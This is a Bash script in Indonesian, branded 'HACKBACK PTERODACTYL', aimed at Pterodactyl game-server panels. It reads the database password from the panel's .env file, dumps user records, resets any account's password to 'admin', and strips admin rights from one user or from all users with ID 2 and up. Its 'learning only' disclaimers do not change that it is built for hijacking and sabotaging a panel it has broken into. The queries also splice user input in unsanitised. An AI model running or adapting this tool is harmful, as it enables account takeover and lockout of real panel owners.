#!/bin/bash

# -------------------------------
# HACKBACK PTERODACTYL - ADVANCED EDITION
# Fitur: Get ID, Ubah Password, Un Admin
# -------------------------------
# * Gunakan dengan bijak!
# * Hanya untuk tujuan pembelajaran
# -------------------------------

# Konfigurasi
PTERO_DIR="/var/www/pterodactyl"
DB_CONFIG="$PTERO_DIR/config/database.php"
ENV_FILE="$PTERO_DIR/.env"

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Password default untuk fitur ubah password
DEFAULT_PASSWORD="admin"

# Header
show_header() {
    clear
    echo -e "${RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${RED}â•‘${WHITE}                                                                        ${RED}â•‘${NC}"
    echo -e "${RED}â•‘${WHITE}      ðŸ”¥ HACKBACK PTERODACTYL - ADVANCED EDITION ðŸ”¥                    ${RED}â•‘${NC}"
    echo -e "${RED}â•‘${WHITE}              *Private Edition - Un Admin + Change PW*                  ${RED}â•‘${NC}"
    echo -e "${RED}â•‘${WHITE}                                                                        ${RED}â•‘${NC}"
    echo -e "${RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -e "${YELLOW}âš ï¸  PERINGATAN: Gunakan hanya untuk pembelajaran!${NC}"
    echo -e "${RED}âš ï¸  Jangan disalahgunakan pada panel orang lain!${NC}"
    echo ""
}

# Function: Extract DB info from .env
get_db_info() {
    if [ -f "$ENV_FILE" ]; then
        DB_HOST=$(grep DB_HOST "$ENV_FILE" | cut -d '=' -f2)
        DB_PORT=$(grep DB_PORT "$ENV_FILE" | cut -d '=' -f2)
        DB_DATABASE=$(grep DB_DATABASE "$ENV_FILE" | cut -d '=' -f2)
        DB_USERNAME=$(grep DB_USERNAME "$ENV_FILE" | cut -d '=' -f2)
        DB_PASSWORD=$(grep DB_PASSWORD "$ENV_FILE" | cut -d '=' -f2)
        
        # Default values jika kosong
        [ -z "$DB_HOST" ] && DB_HOST="127.0.0.1"
        [ -z "$DB_PORT" ] && DB_PORT="3306"
        [ -z "$DB_DATABASE" ] && DB_DATABASE="pterodactyl"
        [ -z "$DB_USERNAME" ] && DB_USERNAME="pterodactyl"
    else
        echo -e "${RED}âŒ File .env tidak ditemukan!${NC}"
        exit 1
    fi
}

# Function: Check MySQL/MariaDB
check_mysql() {
    echo -e "${YELLOW}ðŸ” Memeriksa koneksi database...${NC}"
    
    if command -v mysql &> /dev/null; then
        MYSQL_CMD="mysql"
    elif command -v mariadb &> /dev/null; then
        MYSQL_CMD="mariadb"
    else
        echo -e "${RED}âŒ MySQL/MariaDB tidak ditemukan!${NC}"
        return 1
    fi
    
    # Test koneksi
    if $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -e "USE $DB_DATABASE" 2>/dev/null; then
        echo -e "${GREEN}âœ… Koneksi database berhasil!${NC}"
        return 0
    else
        echo -e "${RED}âŒ Gagal konek ke database!${NC}"
        return 1
    fi
}

# Function: Generate password hash (bcrypt)
generate_hash() {
    local password=$1
    # Gunakan PHP untuk generate hash bcrypt
    HASH=$(php -r "echo password_hash('$password', PASSWORD_BCRYPT);" 2>/dev/null)
    echo "$HASH"
}

# Function: Ubah password user
change_password() {
    local user_id=$1
    local new_password=${2:-$DEFAULT_PASSWORD}
    
    echo -e "\n${YELLOW}ðŸ”‘ Mengubah password user ID: ${WHITE}$user_id${NC}"
    echo -e "${YELLOW}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€${NC}"
    
    # Cek apakah user exists
    CHECK_USER=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id FROM users WHERE id = $user_id" 2>/dev/null)
    
    if [ -z "$CHECK_USER" ]; then
        echo -e "${RED}âŒ User ID $user_id tidak ditemukan!${NC}"
        return 1
    fi
    
    # Generate hash password
    echo -e "${CYAN}âš¡ Menggenerate hash password...${NC}"
    PASSWORD_HASH=$(generate_hash "$new_password")
    
    if [ -z "$PASSWORD_HASH" ]; then
        echo -e "${RED}âŒ Gagal generate hash password!${NC}"
        return 1
    fi
    
    # Update password di database
    QUERY="UPDATE users SET password = '$PASSWORD_HASH' WHERE id = $user_id"
    
    if $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null; then
        echo -e "${GREEN}âœ… Password user ID $user_id berhasil diubah!${NC}"
        echo -e "${WHITE}ðŸ“ Password baru: ${YELLOW}$new_password${NC}"
        
        # Tampilkan info user
        get_user_by_id "$user_id" "simple"
    else
        echo -e "${RED}âŒ Gagal mengubah password!${NC}"
    fi
}

# Function: Un Admin (remove admin privileges)
un_admin() {
    local user_id=$1
    
    echo -e "\n${YELLOW}ðŸ‘‘ Menghapus status admin user ID: ${WHITE}$user_id${NC}"
    echo -e "${YELLOW}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€${NC}"
    
    # Cek apakah user exists
    CHECK_USER=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id FROM users WHERE id = $user_id" 2>/dev/null)
    
    if [ -z "$CHECK_USER" ]; then
        echo -e "${RED}âŒ User ID $user_id tidak ditemukan!${NC}"
        return 1
    fi
    
    # Cek status admin sekarang
    CURRENT_ADMIN=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT root_admin FROM users WHERE id = $user_id" 2>/dev/null | tail -n +2)
    
    if [ "$CURRENT_ADMIN" == "0" ]; then
        echo -e "${YELLOW}âš ï¸  User ID $user_id sudah bukan admin!${NC}"
        return 0
    fi
    
    # Update admin status ke 0
    QUERY="UPDATE users SET root_admin = 0 WHERE id = $user_id"
    
    if $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null; then
        echo -e "${GREEN}âœ… Status admin user ID $user_id telah dihapus!${NC}"
        echo -e "${WHITE}ðŸ“ User sekarang menjadi member biasa${NC}"
        
        # Tampilkan info user
        get_user_by_id "$user_id" "simple"
    else
        echo -e "${RED}âŒ Gagal menghapus status admin!${NC}"
    fi
}

# Function: Batch Un Admin (untuk ID 2 dan seterusnya)
batch_un_admin() {
    local start_id=${1:-2}
    
    echo -e "\n${YELLOW}ðŸ‘‘ Menghapus status admin untuk semua user ID >= $start_id${NC}"
    echo -e "${RED}âš ï¸  PERINGATAN: Tindakan ini akan menghapus semua admin kecuali ID 1!${NC}"
    echo -ne "${CYAN}Yakin lanjut? (y/n): ${NC}"
    read confirm
    
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}Dibatalkan${NC}"
        return 0
    fi
    
    # Hitung total admin yang akan di-un admin
    TOTAL_ADMIN=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) FROM users WHERE root_admin = 1 AND id >= $start_id" 2>/dev/null | tail -n +2)
    
    echo -e "${CYAN}ðŸ“Š Ditemukan $TOTAL_ADMIN admin yang akan di-un admin${NC}"
    
    # Update semua user dengan ID >= start_id menjadi bukan admin
    QUERY="UPDATE users SET root_admin = 0 WHERE id >= $start_id"
    
    if $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null; then
        echo -e "${GREEN}âœ… Berhasil menghapus status admin untuk semua user ID >= $start_id${NC}"
        
        # Tampilkan user yang masih admin (hanya ID 1)
        echo -e "\n${WHITE}ðŸ“‹ Daftar admin yang tersisa:${NC}"
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email FROM users WHERE root_admin = 1" 2>/dev/null | column -t
    else
        echo -e "${RED}âŒ Gagal menjalankan query!${NC}"
    fi
}

# Function: Get user by ID (dengan opsi simple/full)
get_user_by_id() {
    local user_id=$1
    local mode=${2:-full}  # full atau simple
    
    QUERY="SELECT id, uuid, username, email, name_first, name_last, language, root_admin, created_at, updated_at FROM users WHERE id = $user_id"
    
    RESULT=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | tail -n +2)
    
    if [ -n "$RESULT" ]; then
        # Parse result
        ID=$(echo "$RESULT" | awk '{print $1}')
        UUID=$(echo "$RESULT" | awk '{print $2}')
        USERNAME=$(echo "$RESULT" | awk '{print $3}')
        EMAIL=$(echo "$RESULT" | awk '{print $4}')
        FIRST_NAME=$(echo "$RESULT" | awk '{print $5}')
        LAST_NAME=$(echo "$RESULT" | awk '{print $6}')
        LANG=$(echo "$RESULT" | awk '{print $7}')
        ROOT_ADMIN=$(echo "$RESULT" | awk '{print $8}')
        CREATED=$(echo "$RESULT" | awk '{print $9}')
        UPDATED=$(echo "$RESULT" | awk '{print $10}')
        
        if [ "$mode" == "full" ]; then
            echo -e "\n${GREEN}âœ… USER DITEMUKAN!${NC}\n"
            echo -e "${WHITE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
            echo -e "${WHITE}â•‘         DETAIL USER ID $user_id          â•‘${NC}"
            echo -e "${WHITE}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${NC}"
            echo -e "${WHITE}â•‘${NC}"
            echo -e "${WHITE}â•‘  ${CYAN}ID          :${NC} $ID"
            echo -e "${WHITE}â•‘  ${CYAN}UUID        :${NC} $UUID"
            echo -e "${WHITE}â•‘  ${CYAN}Username    :${NC} $USERNAME"
            echo -e "${WHITE}â•‘  ${CYAN}Email       :${NC} $EMAIL"
            echo -e "${WHITE}â•‘  ${CYAN}Nama Depan  :${NC} $FIRST_NAME"
            echo -e "${WHITE}â•‘  ${CYAN}Nama Belakang:${NC} $LAST_NAME"
            echo -e "${WHITE}â•‘  ${CYAN}Language    :${NC} $LANG"
            echo -e "${WHITE}â•‘  ${CYAN}Root Admin  :${NC} $([ "$ROOT_ADMIN" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
            echo -e "${WHITE}â•‘  ${CYAN}Created At  :${NC} $CREATED"
            echo -e "${WHITE}â•‘  ${CYAN}Updated At  :${NC} $UPDATED"
            echo -e "${WHITE}â•‘${NC}"
            echo -e "${WHITE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        else
            # Simple mode
            echo -e "${WHITE}ID: ${GREEN}$ID${NC} | Username: ${CYAN}$USERNAME${NC} | Email: $EMAIL | Admin: $([ "$ROOT_ADMIN" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
        fi
    else
        echo -e "${RED}âŒ User dengan ID $user_id tidak ditemukan!${NC}"
    fi
}

# Function: List all users
list_users() {
    local limit=${1:-10}
    
    echo -e "\n${CYAN}ðŸ“‹ Menampilkan $limit user teratas:${NC}"
    echo -e "${YELLOW}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€${NC}"
    
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users ORDER BY id ASC LIMIT $limit" 2>/dev/null | column -t
    
    echo ""
}

# Function: Get total users
total_users() {
    TOTAL=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) as total FROM users" 2>/dev/null | tail -n +2)
    ADMIN_COUNT=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) as admin FROM users WHERE root_admin = 1" 2>/dev/null | tail -n +2)
    
    echo -e "${GREEN}ðŸ“Š Total users: ${WHITE}$TOTAL${NC}"
    echo -e "${GREEN}ðŸ‘‘ Total admin: ${WHITE}$ADMIN_COUNT${NC}"
}

# Function: Show main menu
show_menu() {
    echo ""
    echo -e "${WHITE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${WHITE}â•‘                    ðŸ”¥ MENU HACKBACK ADVANCED ðŸ”¥                  â•‘${NC}"
    echo -e "${WHITE}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${NC}"
    echo -e "${WHITE}â•‘                                                                  â•‘${NC}"
    echo -e "${WHITE}â•‘  ${RED}[1]${NC} ðŸ” Get User by ID                         ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[2]${NC} ðŸ“‹ List All Users                       ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${YELLOW}[3]${NC} ðŸ“Š Total Users & Admin                  ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${BLUE}[4]${NC} ðŸ‘¤ Cari by Username                     ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${PURPLE}[5]${NC} ðŸ“§ Cari by Email                        ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${CYAN}[6]${NC} ðŸ‘‘ Cek Admin Status                     ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${RED}[7]${NC} ðŸ–¥ï¸  Lihat Servers User                    ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[8]${NC} âš¡ Get ID 1 (LANGSUNG)                  ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${YELLOW}[9]${NC} ðŸ”‘ UBAH PASSWORD USER                   ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${BLUE}[10]${NC} ðŸ‘‘ UN ADMIN (Single User)               ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${PURPLE}[11]${NC} ðŸ‘‘ðŸ‘‘ BATCH UN ADMIN (ID >= 2)          ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${RED}[0]${NC} ðŸšª Keluar                                ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘                                                                  â•‘${NC}"
    echo -e "${WHITE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -ne "${YELLOW}âž¤ Pilih menu [0-11]: ${NC}"
}

# Main function
main() {
    show_header
    
    # Get DB info
    get_db_info
    
    # Check MySQL connection
    if ! check_mysql; then
        echo -e "\n${RED}âŒ Tidak bisa mengakses database!${NC}"
        exit 1
    fi
    
    # Menu loop
    while true; do
        show_menu
        read choice
        
        case $choice in
            1)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                get_user_by_id "$user_id"
                ;;
            2)
                echo -ne "${CYAN}Jumlah user yang ditampilkan (default 10): ${NC}"
                read limit
                limit=${limit:-10}
                list_users "$limit"
                ;;
            3)
                total_users
                ;;
            4)
                echo -ne "${CYAN}Masukkan username: ${NC}"
                read username
                echo -e "\n${CYAN}ðŸ” Mencari user: ${WHITE}$username${NC}"
                $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users WHERE username LIKE '%$username%' ORDER BY id ASC" 2>/dev/null | column -t
                ;;
            5)
                echo -ne "${CYAN}Masukkan email: ${NC}"
                read email
                echo -e "\n${CYAN}ðŸ” Mencari user: ${WHITE}$email${NC}"
                $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users WHERE email LIKE '%$email%' ORDER BY id ASC" 2>/dev/null | column -t
                ;;
            6)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                check_admin "$user_id"
                ;;
            7)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                get_user_servers "$user_id"
                ;;
            8)
                echo -e "\n${GREEN}âš¡ Mengakses USER ID 1...${NC}"
                get_user_by_id 1
                echo ""
                get_user_servers 1
                ;;
            9)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                echo -ne "${CYAN}Password baru (enter untuk default 'admin'): ${NC}"
                read new_pass
                new_pass=${new_pass:-$DEFAULT_PASSWORD}
                change_password "$user_id" "$new_pass"
                ;;
            10)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                un_admin "$user_id"
                ;;
            11)
                echo -ne "${CYAN}Mulai dari ID (default 2): ${NC}"
                read start_id
                start_id=${start_id:-2}
                batch_un_admin "$start_id"
                ;;
            0)
                echo -e "\n${GREEN}âœ¨ Thanks for using Hackback Advanced Edition!${NC}"
                echo -e "${RED}â¤ï¸  Jangan lupa subscribe channel Rendzz Official!${NC}"
                echo -e "${CYAN}ðŸ“± Telegram: @lynnn046${NC}\n"
                exit 0
                ;;
            *)
                echo -e "${RED}Pilihan tidak valid!${NC}"
                ;;
        esac
        
        echo ""
        echo -ne "${CYAN}Tekan Enter untuk melanjutkan...${NC}"
        read
        clear
        show_header
    done
}

# Function: Check admin status
check_admin() {
    local user_id=$1
    
    QUERY="SELECT root_admin FROM users WHERE id = $user_id"
    
    IS_ADMIN=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | tail -n +2)
    
    if [ "$IS_ADMIN" == "1" ]; then
        echo -e "${GREEN}âœ… User ID $user_id adalah ADMIN!${NC}"
    else
        echo -e "${RED}âŒ User ID $user_id BUKAN admin${NC}"
    fi
}

# Function: Get user servers
get_user_servers() {
    local user_id=$1
    
    echo -e "\n${CYAN}ðŸ–¥ï¸  Server milik user ID $user_id:${NC}"
    echo -e "${YELLOW}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€${NC}"
    
    QUERY="SELECT s.id, s.uuid, s.name, s.description, n.name as node_name, e.name as egg_name 
           FROM servers s 
           LEFT JOIN nodes n ON s.node_id = n.id 
           LEFT JOIN eggs e ON s.egg_id = e.id 
           WHERE s.owner_id = $user_id"
    
    RESULT=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | tail -n +2)
    
    if [ -n "$RESULT" ]; then
        echo "$RESULT" | while read line; do
            SERVER_ID=$(echo "$line" | awk '{print $1}')
            SERVER_UUID=$(echo "$line" | awk '{print $2}')
            SERVER_NAME=$(echo "$line" | awk '{print $3}')
            SERVER_DESC=$(echo "$line" | awk '{print $4}')
            NODE_NAME=$(echo "$line" | awk '{print $5}')
            EGG_NAME=$(echo "$line" | awk '{print $6}')
            
            echo -e "${WHITE}ID: ${GREEN}$SERVER_ID${NC}"
            echo -e "  Name: $SERVER_NAME"
            echo -e "  Node: $NODE_NAME"
            echo -e "  Egg: $EGG_NAME"
            echo -e "  UUID: $SERVER_UUID"
            echo "---"
        done
    else
        echo -e "${YELLOW}User ini tidak memiliki server${NC}"
    fi
}

# Run main function
main
